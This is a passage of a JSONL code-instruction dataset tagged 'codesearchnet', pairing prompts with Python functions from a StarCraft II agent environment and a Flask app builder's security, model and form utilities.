get_replay_version(replay_data)\n\n  with run_config.start(version=version,\n                        full_screen=FLAGS.full_screen) as controller:\n    if FLAGS.map:\n      controller.create_game(create)\n      controller.join_game(join)\n    else:\n      info = controller.replay_info(replay_data)\n      print(\" Replay info \".center(60, \"-\"))\n      print(info)\n      print(\"-\" * 60)\n      map_path = FLAGS.map_path or info.local_map_path\n      if map_path:\n        start_replay.map_data = run_config.map_data(map_path)\n      controller.start_replay(start_replay)\n\n    if FLAGS.render:\n      renderer = renderer_human.RendererHuman(\n          fps=FLAGS.fps, step_mul=FLAGS.step_mul,\n          render_sync=FLAGS.render_sync, video=FLAGS.video)\n      renderer.run(\n          run_config, controller, max_game_steps=FLAGS.max_game_steps,\n          game_steps_per_episode=max_episode_steps,\n          save_replay=FLAGS.save_replay)\n    else:  # Still step forward so the Mac/Windows renderer works.\n      try:\n        while True:\n          frame_start_time = time.time()\n          if not FLAGS.realtime:\n            controller.step(FLAGS.step_mul)\n          obs = controller.observe()\n\n          if obs.player_result:\n            break\n          time.sleep(max(0, frame_start_time + 1 / FLAGS.fps - time.time()))\n      except KeyboardInterrupt:\n        pass\n      print(\"Score: \", obs.observation.score.score)\n      print(\"Result: \", obs.player_result)\n      if FLAGS.map and FLAGS.save_replay:\n        replay_save_loc = run_config.save_replay(\n            controller.save_replay(), \"local\", FLAGS.map)\n        print(\"Replay saved to:\", replay_save_loc)\n        # Save scores so we know how the human player did.\n        with open(replay_save_loc.replace(\"SC2Replay\", \"txt\"), \"w\") as f:\n          f.write(\"{}\\n\".format(obs.observation.score.score))\n\n  if FLAGS.profile:\n    print(stopwatch.sw)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nwait for a process to shut down then terminate or kill it after timeout.", "response": "def _shutdown_proc(p, timeout):\n  \"\"\"Wait for a proc to shut down, then terminate or kill it after `timeout`.\"\"\"\n  freq = 10  # how often to check per second\n  for _ in range(1 + timeout * freq):\n    ret = p.poll()\n    if ret is not None:\n      logging.info(\"Shutdown gracefully.\")\n      return ret\n    time.sleep(1 / freq)\n  logging.warning(\"Killing the process.\")\n  p.kill()\n  return p.wait()"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nshut down the game and clean up.", "response": "def close(self):\n    \"\"\"Shut down the game and clean up.\"\"\"\n    if hasattr(self, \"_controller\") and self._controller:\n      self._controller.quit()\n      self._controller.close()\n      self._controller = None\n    self._shutdown()\n    if hasattr(self, \"_port\") and self._port:\n      portpicker.return_port(self._port)\n      self._port = None\n    if hasattr(self, \"_tmp_dir\") and os.path.exists(self._tmp_dir):\n      shutil.rmtree(self._tmp_dir)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nlaunches the process and return the process object.", "response": "def _launch(self, run_config, args, **kwargs):\n    \"\"\"Launch the process and return the process object.\"\"\"\n    del kwargs\n    try:\n      with sw(\"popen\"):\n        return subprocess.Popen(args, cwd=run_config.cwd, env=run_config.env)\n    except OSError:\n      logging.exception(\"Failed to launch\")\n      raise SC2LaunchError(\"Failed to launch: %s\" % args)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nterminating the sub - process.", "response": "def _shutdown(self):\n    \"\"\"Terminate the sub-process.\"\"\"\n    if self._proc:\n      ret = _shutdown_proc(self._proc, 3)\n      logging.info(\"Shutdown with return code: %s\", ret)\n      self._proc = None"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nretrieve static data from the game.", "response": "def get_data():\n  \"\"\"Retrieve static data from the game.\"\"\"\n  run_config = run_configs.get()\n\n  with run_config.start(want_rgb=False) as controller:\n    m = maps.get(\"Sequencer\")  # Arbitrary ladder map.\n    create = sc_pb.RequestCreateGame(local_map=sc_pb.LocalMap(\n        map_path=m.path, map_data=m.data(run_config)))\n    create.player_setup.add(type=sc_pb.Participant)\n    create.player_setup.add(type=sc_pb.Computer, race=sc_common.Random,\n                            difficulty=sc_pb.VeryEasy)\n    join = sc_pb.RequestJoinGame(race=sc_common.Random,\n                                 options=sc_pb.InterfaceOptions(raw=True))\n\n    controller.create_game(create)\n    controller.join_game(join)\n    return controller.data()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate a CSV of the abilities for easy commenting.", "response": "def generate_csv(data):\n  \"\"\"Generate a CSV of the abilities for easy commenting.\"\"\"\n  print(\",\".join([\n      \"ability_id\",\n      \"link_name\",\n      \"link_index\",\n      \"button_name\",\n      \"hotkey\",\n      \"friendly_name\",\n      \"remap_to\",\n      \"mismatch\",\n  ]))\n  for ability in sorted(six.itervalues(data.abilities),\n                        key=lambda a: sort_key(data, a)):\n    ab_id = ability.ability_id\n    if ab_id in skip_abilities or (ab_id not in data.general_abilities and\n                                   ab_id not in used_abilities):\n      continue\n\n    general = \"\"\n    if ab_id in data.general_abilities:\n      general = \"general\"\n    elif ability.remaps_to_ability_id:\n      general = ability.remaps_to_ability_id\n\n    mismatch = \"\"\n    if ability.remaps_to_ability_id:\n      def check_mismatch(ability, parent, attr):\n        if getattr(ability, attr) != getattr(parent, attr):\n          return \"%s: %s\" % (attr, getattr(ability, attr))\n\n      parent = data.abilities[ability.remaps_to_ability_id]\n      mismatch = \"; \".join(filter(None, [\n          check_mismatch(ability, parent, \"available\"),\n          check_mismatch(ability, parent, \"target\"),\n          check_mismatch(ability, parent, \"allow_minimap\"),\n          check_mismatch(ability, parent, \"allow_autocast\"),\n          check_mismatch(ability, parent, \"is_building\"),\n          check_mismatch(ability, parent, \"footprint_radius\"),\n          check_mismatch(ability, parent, \"is_instant_placement\"),\n          check_mismatch(ability, parent, \"cast_range\"),\n      ]))\n\n    print(\",\".join(str(s) for s in [\n        ability.ability_id,\n        ability.link_name,\n        ability.link_index,\n        ability.button_name,\n        ability.hotkey,\n        ability.friendly_name,\n        general,\n        mismatch,\n    ]))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef generate_py_abilities(data):\n  def print_action(func_id, name, func, ab_id, general_id):\n    args = [func_id, '\"%s\"' % name, func, ab_id]\n    if general_id:\n      args.append(general_id)\n    print(\"    Function.ability(%s),\" % \", \".join(str(v) for v in args))\n\n  func_ids = itertools.count(12)  # Leave room for the ui funcs.\n  for ability in sorted(six.itervalues(data.abilities),\n                        key=lambda a: sort_key(data, a)):\n    ab_id = ability.ability_id\n    if ab_id in skip_abilities or (ab_id not in data.general_abilities and\n                                   ab_id not in used_abilities):\n      continue\n\n    name = generate_name(ability).replace(\" \", \"_\")\n\n    if ability.target in (sc_data.AbilityData.Target.Value(\"None\"),\n                          sc_data.AbilityData.PointOrNone):\n      print_action(next(func_ids), name + \"_quick\", \"cmd_quick\", ab_id,\n                   ability.remaps_to_ability_id)\n    if ability.target != sc_data.AbilityData.Target.Value(\"None\"):\n      print_action(next(func_ids), name+ \"_screen\", \"cmd_screen\", ab_id,\n                   ability.remaps_to_ability_id)\n      if ability.allow_minimap:\n        print_action(next(func_ids), name + \"_minimap\", \"cmd_minimap\", ab_id,\n                     ability.remaps_to_ability_id)\n    if ability.allow_autocast:\n      print_action(next(func_ids), name + \"_autocast\", \"autocast\", ab_id,\n                   ability.remaps_to_ability_id)", "response": "Generate the list of functions in actions. py."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrun the agent connecting to a remote host.", "response": "def agent():\n  \"\"\"Run the agent, connecting to a (remote) host started independently.\"\"\"\n  agent_module, agent_name = FLAGS.agent.rsplit(\".\", 1)\n  agent_cls = getattr(importlib.import_module(agent_module), agent_name)\n\n  logging.info(\"Starting agent:\")\n  with remote_sc2_env.RemoteSC2Env(\n      map_name=FLAGS.map,\n      host=FLAGS.host,\n      host_port=FLAGS.host_port,\n      lan_port=FLAGS.lan_port,\n      name=FLAGS.agent_name or agent_name,\n      race=sc2_env.Race[FLAGS.agent_race],\n      step_mul=FLAGS.step_mul,\n      agent_interface_format=sc2_env.parse_agent_interface_format(\n          feature_screen=FLAGS.feature_screen_size,\n          feature_minimap=FLAGS.feature_minimap_size,\n          rgb_screen=FLAGS.rgb_screen_size,\n          rgb_minimap=FLAGS.rgb_minimap_size,\n          action_space=FLAGS.action_space,\n          use_feature_units=FLAGS.use_feature_units),\n      visualize=FLAGS.render) as env:\n    agents = [agent_cls()]\n    logging.info(\"Connected, starting run_loop.\")\n    try:\n      run_loop.run_loop(agents, env)\n    except remote_sc2_env.RestartException:\n      pass\n  logging.info(\"Done.\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nruns a host which expects one player to connect remotely.", "response": "def human():\n  \"\"\"Run a host which expects one player to connect remotely.\"\"\"\n  run_config = run_configs.get()\n\n  map_inst = maps.get(FLAGS.map)\n\n  if not FLAGS.rgb_screen_size or not FLAGS.rgb_minimap_size:\n    logging.info(\"Use --rgb_screen_size and --rgb_minimap_size if you want rgb \"\n                 \"observations.\")\n\n  ports = portspicker.pick_contiguous_unused_ports(4)  # 2 * num_players\n  host_proc = run_config.start(extra_ports=ports, host=FLAGS.host,\n                               timeout_seconds=FLAGS.timeout_seconds,\n                               window_loc=(50, 50))\n  client_proc = run_config.start(extra_ports=ports, host=FLAGS.host,\n                                 connect=False, window_loc=(700, 50))\n\n  create = sc_pb.RequestCreateGame(\n      realtime=FLAGS.realtime, local_map=sc_pb.LocalMap(map_path=map_inst.path))\n  create.player_setup.add(type=sc_pb.Participant)\n  create.player_setup.add(type=sc_pb.Participant)\n\n  controller = host_proc.controller\n  controller.save_map(map_inst.path, map_inst.data(run_config))\n  controller.create_game(create)\n\n  print(\"-\" * 80)\n  print(\"Join host: agent_remote --map %s --host %s --host_port %s \"\n        \"--lan_port %s\" % (FLAGS.map, FLAGS.host, client_proc.port, ports[0]))\n  print(\"-\" * 80)\n  sys.stdout.flush()\n\n  join = sc_pb.RequestJoinGame()\n  join.shared_port = 0  # unused\n  join.server_ports.game_port = ports.pop(0)\n  join.server_ports.base_port = ports.pop(0)\n  join.client_ports.add(game_port=ports.pop(0), base_port=ports.pop(0))\n\n  join.race = sc2_env.Race[FLAGS.user_race]\n  join.player_name = FLAGS.user_name\n  if FLAGS.render:\n    join.options.raw = True\n    join.options.score = True\n    if FLAGS.feature_screen_size and FLAGS.feature_minimap_size:\n      fl = join.options.feature_layer\n      fl.width = 24\n      FLAGS.feature_screen_size.assign_to(fl.resolution)\n      FLAGS.feature_minimap_size.assign_to(fl.minimap_resolution)\n    if FLAGS.rgb_screen_size and FLAGS.rgb_minimap_size:\n      FLAGS.rgb_screen_size.assign_to(join.options.render.resolution)\n      FLAGS.rgb_minimap_size.assign_to(join.options.render.minimap_resolution)\n  controller.join_game(join)\n\n  if FLAGS.render:\n    renderer = renderer_human.RendererHuman(\n        fps=FLAGS.fps, render_feature_grid=False)\n    renderer.run(run_configs.get(), controller, max_episodes=1)\n  else:  # Still step forward so the Mac/Windows renderer works.\n    try:\n      while True:\n        frame_start_time = time.time()\n        if not FLAGS.realtime:\n          controller.step()\n        obs = controller.observe()\n\n        if obs.player_result:\n          break\n        time.sleep(max(0, frame_start_time - time.time() + 1 / FLAGS.fps))\n    except KeyboardInterrupt:\n      pass\n\n  for p in [host_proc, client_proc]:\n    p.close()\n\n  portspicker.return_ports(ports)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef decorate(self, name_or_func):\n    if os.environ.get(\"SC2_NO_STOPWATCH\"):\n      return name_or_func if callable(name_or_func) else lambda func: func\n\n    def decorator(name, func):\n      @functools.wraps(func)\n      def _stopwatch(*args, **kwargs):\n        with self(name):\n          return func(*args, **kwargs)\n      return _stopwatch\n    if callable(name_or_func):\n      return decorator(name_or_func.__name__, name_or_func)\n    else:\n      return lambda func: decorator(name_or_func, func)", "response": "Decorate a function or method to check its timings."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse(s):\n    stopwatch = StopWatch()\n    for line in s.splitlines():\n      if line.strip():\n        parts = line.split(None)\n        name = parts[0]\n        if name != \"%\":  # ie not the header line\n          rest = (float(v) for v in parts[2:])\n          stopwatch.times[parts[0]].merge(Stat.build(*rest))\n    return stopwatch", "response": "Parse the output below to create a new StopWatch object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a string representation of the timings.", "response": "def str(self, threshold=0.1):\n    \"\"\"Return a string representation of the timings.\"\"\"\n    if not self._times:\n      return \"\"\n    total = sum(s.sum for k, s in six.iteritems(self._times) if \".\" not in k)\n    table = [[\"\", \"% total\", \"sum\", \"avg\", \"dev\", \"min\", \"max\", \"num\"]]\n    for k, v in sorted(self._times.items()):\n      percent = 100 * v.sum / (total or 1)\n      if percent > threshold:  # ignore anything below the threshold\n        table.append([\n            k,\n            \"%.2f%%\" % percent,\n            \"%.4f\" % v.sum,\n            \"%.4f\" % v.avg,\n            \"%.4f\" % v.dev,\n            \"%.4f\" % v.min,\n            \"%.4f\" % v.max,\n            \"%d\" % v.num,\n        ])\n    col_widths = [max(len(row[i]) for row in table)\n                  for i in range(len(table[0]))]\n\n    out = \"\"\n    for row in table:\n      out += \"  \" + row[0].ljust(col_widths[0]) + \"  \"\n      out += \"  \".join(\n          val.rjust(width) for val, width in zip(row[1:], col_widths[1:]))\n      out += \"\\n\"\n    return out"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef generate_py_units(data):\n  units = collections.defaultdict(list)\n  for unit in sorted(data.units, key=lambda a: a.name):\n    if unit.unit_id in static_data.UNIT_TYPES:\n      units[unit.race].append(unit)\n\n  def print_race(name, race):\n    print(\"class %s(enum.IntEnum):\" % name)\n    print('  \"\"\"%s units.\"\"\"' % name)\n    for unit in units[race]:\n      print(\"  %s = %s\" % (unit.name, unit.unit_id))\n    print(\"\\n\")\n\n  print_race(\"Neutral\", sc_common.NoRace)\n  print_race(\"Protoss\", sc_common.Protoss)\n  print_race(\"Terran\", sc_common.Terran)\n  print_race(\"Zerg\", sc_common.Zerg)", "response": "Generate the list of units in units. py."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef run(self, funcs):\n    funcs = [f if callable(f) else functools.partial(*f) for f in funcs]\n    if len(funcs) == 1:  # Ignore threads if it's not needed.\n      return [funcs[0]()]\n    if len(funcs) > self._workers:  # Lazy init and grow as needed.\n      self.shutdown()\n      self._workers = len(funcs)\n      self._executor = futures.ThreadPoolExecutor(self._workers)\n    futs = [self._executor.submit(f) for f in funcs]\n    done, not_done = futures.wait(futs, self._timeout, futures.FIRST_EXCEPTION)\n    # Make sure to propagate any exceptions.\n    for f in done:\n      if not f.cancelled() and f.exception() is not None:\n        if not_done:\n          # If there are some calls that haven't finished, cancel and recreate\n          # the thread pool. Otherwise we may have a thread running forever\n          # blocking parallel calls.\n          for nd in not_done:\n            nd.cancel()\n          self.shutdown(False)  # Don't wait, they may be deadlocked.\n        raise f.exception()\n    # Either done or timed out, so don't wait again.\n    return [f.result(timeout=0) for f in futs]", "response": "Run a set of functions in parallel returning their results."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts a list of dicts from datamodel query results AttributeNames to google chart json data.", "response": "def dict_to_json(xcol, ycols, labels, value_columns):\n    \"\"\"\n        Converts a list of dicts from datamodel query results\n        to google chart json data.\n\n        :param xcol:\n            The name of a string column to be used has X axis on chart\n        :param ycols:\n            A list with the names of series cols, that can be used as numeric\n        :param labels:\n            A dict with the columns labels.\n        :param value_columns:\n            A list of dicts with the values to convert\n    \"\"\"\n    json_data = dict()\n\n    json_data['cols'] = [{'id': xcol,\n                          'label': as_unicode(labels[xcol]),\n                          'type': 'string'}]\n    for ycol in ycols:\n        json_data['cols'].append({'id': ycol,\n                                  'label': as_unicode(labels[ycol]),\n                                  'type': 'number'})\n    json_data['rows'] = []\n    for value in value_columns:\n        row = {'c': []}\n        if isinstance(value[xcol], datetime.date):\n            row['c'].append({'v': (str(value[xcol]))})\n        else:\n            row['c'].append({'v': (value[xcol])})\n        for ycol in ycols:\n            if value[ycol]:\n                row['c'].append({'v': (value[ycol])})\n            else:\n                row['c'].append({'v': 0})\n        json_data['rows'].append(row)\n    return json_data"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, version):\n        version_found = False\n        api_spec = self._create_api_spec(version)\n        for base_api in current_app.appbuilder.baseviews:\n            if isinstance(base_api, BaseApi) and base_api.version == version:\n                base_api.add_api_spec(api_spec)\n                version_found = True\n        if version_found:\n            return self.response(200, **api_spec.to_dict())\n        else:\n            return self.response_404()", "response": "Endpoint that renders an OpenApi spec for all views that belong to a certain version"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nhelp function for SQLA filters.", "response": "def get_field_setup_query(query, model, column_name):\n    \"\"\"\n        Help function for SQLA filters, checks for dot notation on column names.\n        If it exists, will join the query with the model\n        from the first part of the field name.\n\n        example:\n            Contact.created_by: if created_by is a User model,\n            it will be joined to the query.\n    \"\"\"\n    if not hasattr(model, column_name):\n        # it's an inner obj attr\n        rel_model = getattr(model, column_name.split(\".\")[0]).mapper.class_\n        query = query.join(rel_model)\n        return query, getattr(rel_model, column_name.split(\".\")[1])\n    else:\n        return query, getattr(model, column_name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd a permission to the backend model permission", "response": "def add_permission(self, name):\n        \"\"\"\n            Adds a permission to the backend, model permission\n\n            :param name:\n                name of the permission: 'can_add','can_edit' etc...\n        \"\"\"\n        perm = self.find_permission(name)\n        if perm is None:\n            try:\n                perm = self.permission_model(name=name)\n                perm.save()\n                return perm\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_ADD_PERMISSION.format(str(e)))\n        return perm"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_view_menu(self, name):\n        view_menu = self.find_view_menu(name)\n        if view_menu is None:\n            try:\n                view_menu = self.viewmenu_model(name=name)\n                view_menu.save()\n                return view_menu\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_ADD_VIEWMENU.format(str(e)))\n        return view_menu", "response": "Adds a view or menu to the backend model view_menu\n            returns the newly created view_menu object"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef del_view_menu(self, name):\n        obj = self.find_view_menu(name)\n        if obj:\n            try:\n                obj.delete()\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_DEL_PERMISSION.format(str(e)))", "response": "Deletes a ViewMenu from the backend"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfinds and returns a PermissionView by names", "response": "def find_permission_view_menu(self, permission_name, view_menu_name):\n        \"\"\"\n            Finds and returns a PermissionView by names\n        \"\"\"\n        permission = self.find_permission(permission_name)\n        view_menu = self.find_view_menu(view_menu_name)\n        if permission and view_menu:\n            return self.permissionview_model.objects(\n                permission=permission, view_menu=view_menu\n            ).first()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_permission_view_menu(self, permission_name, view_menu_name):\n        if not (permission_name and view_menu_name):\n            return None\n        pv = self.find_permission_view_menu(\n            permission_name,\n            view_menu_name\n        )\n        if pv:\n            return pv\n        vm = self.add_view_menu(view_menu_name)\n        perm = self.add_permission(permission_name)\n        pv = self.permissionview_model()\n        pv.view_menu, pv.permission = vm, perm\n        try:\n            pv.save()\n            log.info(c.LOGMSG_INF_SEC_ADD_PERMVIEW.format(str(pv)))\n            return pv\n        except Exception as e:\n            log.error(c.LOGMSG_ERR_SEC_ADD_PERMVIEW.format(str(e)))", "response": "Adds a permission on a view or menu to the backend."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef add_permission_role(self, role, perm_view):\n        if perm_view not in role.permissions:\n            try:\n                role.permissions.append(perm_view)\n                role.save()\n                log.info(\n                    c.LOGMSG_INF_SEC_ADD_PERMROLE.format(str(perm_view), role.name)\n                )\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_ADD_PERMROLE.format(str(e)))", "response": "Adds permission - ViewMenu object to the specified role."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nremoves permission - ViewMenu object to the specified role.", "response": "def del_permission_role(self, role, perm_view):\n        \"\"\"\n            Remove permission-ViewMenu object to Role\n\n            :param role:\n                The role object\n            :param perm_view:\n                The PermissionViewMenu object\n        \"\"\"\n        if perm_view in role.permissions:\n            try:\n                role.permissions.remove(perm_view)\n                role.save()\n                log.info(\n                    c.LOGMSG_INF_SEC_DEL_PERMROLE.format(str(perm_view), role.name)\n                )\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_DEL_PERMROLE.format(str(e)))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a list of the columns that are used by the object.", "response": "def get_columns_list(self):\n        \"\"\"\n        modified: removing the '_cls' column added by Mongoengine to support\n        mongodb document inheritance\n        cf. http://docs.mongoengine.org/apireference.html#documents:\n        \"A Document subclass may be itself subclassed,\n        to create a specialised version of the document that will be\n        stored in the same collection.\n        To facilitate this behaviour a _cls field is added to documents\n        (hidden though the MongoEngine interface).\n        To disable this behaviour and remove the dependence on the presence of _cls set\n        allow_inheritance to False in the meta dictionary.\"\n        \"\"\"\n        columns = list(self.obj._fields.keys())\n        if \"_cls\" in columns:\n            columns.remove(\"_cls\")\n        return columns"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the list of columns that can be ordered by the user.", "response": "def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if hasattr(self.obj, col_name):\n                if not hasattr(getattr(self.obj, col_name), \"__call__\"):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a list of pk values from object list", "response": "def get_keys(self, lst):\n        \"\"\"\n            return a list of pk values from object list\n        \"\"\"\n        pk_name = self.get_pk_name()\n        return [getattr(item, pk_name) for item in lst]"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses this decorator to map your custom Model properties to actual Model db properties. As an example:: class MyModel(Model): id = Column(Integer, primary_key=True) name = Column(String(50), unique = True, nullable=False) custom = Column(Integer(20)) @renders('custom') def my_custom(self): # will render this columns as bold on ListWidget return Markup('<b>' + custom + '</b>') class MyModelView(ModelView): datamodel = SQLAInterface(MyTable) list_columns = ['name', 'my_custom']", "response": "def renders(col_name):\n    \"\"\"\n        Use this decorator to map your custom Model properties to actual\n        Model db properties. As an example::\n\n            class MyModel(Model):\n                id = Column(Integer, primary_key=True)\n                name = Column(String(50), unique = True, nullable=False)\n                custom = Column(Integer(20))\n\n                @renders('custom')\n                def my_custom(self):\n                    # will render this columns as bold on ListWidget\n                    return Markup('<b>' + custom + '</b>')\n\n            class MyModelView(ModelView):\n                datamodel = SQLAInterface(MyTable)\n                list_columns = ['name', 'my_custom']\n\n    \"\"\"\n\n    def wrap(f):\n        if not hasattr(f, '_col_name'):\n            f._col_name = col_name\n        return f\n\n    return wrap"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nformats values for list template. returns a list of dicts", "response": "def _get_values(self, lst, list_columns):\n        \"\"\"\n            Get Values: formats values for list template.\n            returns [{'col_name':'col_value',....},{'col_name':'col_value',....}]\n\n            :param lst:\n                The list of item objects from query\n            :param list_columns:\n                The list of columns to include\n        \"\"\"\n        retlst = []\n        for item in lst:\n            retdict = {}\n            for col in list_columns:\n                retdict[col] = self._get_attr_value(item, col)\n            retlst.append(retdict)\n        return retlst"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting values for the items in lst", "response": "def get_values(self, lst, list_columns):\n        \"\"\"\n            Get Values: formats values for list template.\n            returns [{'col_name':'col_value',....},{'col_name':'col_value',....}]\n\n            :param lst:\n                The list of item objects from query\n            :param list_columns:\n                The list of columns to include\n        \"\"\"\n        for item in lst:\n            retdict = {}\n            for col in list_columns:\n                retdict[col] = self._get_attr_value(item, col)\n            yield retdict"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconvert list of objects from query to JSON", "response": "def get_values_json(self, lst, list_columns):\n        \"\"\"\n            Converts list of objects from query to JSON\n        \"\"\"\n        result = []\n        for item in self.get_values(lst, list_columns):\n            for key, value in list(item.items()):\n                if isinstance(value, datetime.datetime) or isinstance(\n                    value, datetime.date\n                ):\n                    value = value.isoformat()\n                    item[key] = value\n                if isinstance(value, list):\n                    item[key] = [str(v) for v in value]\n            result.append(item)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of pk values from object list", "response": "def get_keys(self, lst):\n        \"\"\"\n            return a list of pk values from object list\n        \"\"\"\n        pk_name = self.get_pk_name()\n        if self.is_pk_composite():\n            return [[getattr(item, pk) for pk in pk_name] for item in lst]\n        else:\n            return [getattr(item, pk_name) for item in lst]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_registration(self, username, first_name, last_name, email, password=\"\"):\n        register_user = self.appbuilder.sm.add_register_user(\n            username, first_name, last_name, email, password\n        )\n        if register_user:\n            if self.send_email(register_user):\n                flash(as_unicode(self.message), \"info\")\n                return register_user\n            else:\n                flash(as_unicode(self.error_message), \"danger\")\n                self.appbuilder.sm.del_register_user(register_user)\n                return None", "response": "Adds a new registration request for the user."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef activation(self, activation_hash):\n        reg = self.appbuilder.sm.find_register_user(activation_hash)\n        if not reg:\n            log.error(c.LOGMSG_ERR_SEC_NO_REGISTER_HASH.format(activation_hash))\n            flash(as_unicode(self.false_error_message), \"danger\")\n            return redirect(self.appbuilder.get_url_for_index)\n        if not self.appbuilder.sm.add_user(\n            username=reg.username,\n            email=reg.email,\n            first_name=reg.first_name,\n            last_name=reg.last_name,\n            role=self.appbuilder.sm.find_role(\n                self.appbuilder.sm.auth_user_registration_role\n            ),\n            hashed_password=reg.password,\n        ):\n            flash(as_unicode(self.error_message), \"danger\")\n            return redirect(self.appbuilder.get_url_for_index)\n        else:\n            self.appbuilder.sm.del_register_user(reg)\n            return self.render_template(\n                self.activation_template,\n                username=reg.username,\n                first_name=reg.first_name,\n                last_name=reg.last_name,\n                appbuilder=self.appbuilder,\n            )", "response": "This endpoint is used to expose an activation url for the user."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef oid_login_handler(self, f, oid):\n        if request.args.get(\"openid_complete\") != u\"yes\":\n            return f(False)\n        consumer = Consumer(SessionWrapper(self), oid.store_factory())\n        openid_response = consumer.complete(\n            request.args.to_dict(), oid.get_current_url()\n        )\n        if openid_response.status == SUCCESS:\n            return self.after_login(OpenIDResponse(openid_response, []))\n        elif openid_response.status == CANCEL:\n            oid.signal_error(u\"The request was cancelled\")\n            return redirect(oid.get_current_url())\n        oid.signal_error(u\"OpenID authentication error\")\n        return redirect(oid.get_current_url())", "response": "This method is used to make use of oid. login_handler decorator. It is used to make use of oid. login_handler decorator."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprocess the Python data applied to this field and store the result in the object attribute.", "response": "def process_data(self, value):\n        \"\"\"\n        Process the Python data applied to this field and store the result.\n        This will be called during form construction by the form's `kwargs` or\n        `obj` argument.\n\n        Converting ORM object to primary key for client form.\n\n        :param value: The python object containing the value to process.\n        \"\"\"\n        if value:\n            if self.is_related:\n                self.data = self.datamodel.get_related_interface(\n                    self.col_name\n                ).get_pk_value(value)\n            else:\n                self.data = self.datamodel.get(value)\n        else:\n            self.data = None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nprocess data received over the wire from a form.", "response": "def process_formdata(self, valuelist):\n        \"\"\"\n        Process data received over the wire from a form.\n        This will be called during form construction with data supplied\n        through the `formdata` argument.\n\n        Converting primary key to ORM for server processing.\n\n        :param valuelist: A list of strings to process.\n        \"\"\"\n        if valuelist:\n            if self.is_related:\n                self.data = self.datamodel.get_related_interface(self.col_name).get(\n                    valuelist[0]\n                )\n            else:\n                self.data = self.datamodel.get(valuelist[0])"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_group_by_class(self, definition):\n        group_by = definition[\"group\"]\n        series = definition[\"series\"]\n        if \"formatter\" in definition:\n            formatter = {group_by: definition[\"formatter\"]}\n        else:\n            formatter = {}\n        return self.ProcessClass([group_by], series, formatter)", "response": "Returns the processing class that is a direct or grouped object."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets page arguments returns a dictionary containing the page number of the current page.", "response": "def get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall(\"page_(.*)\", arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages"}
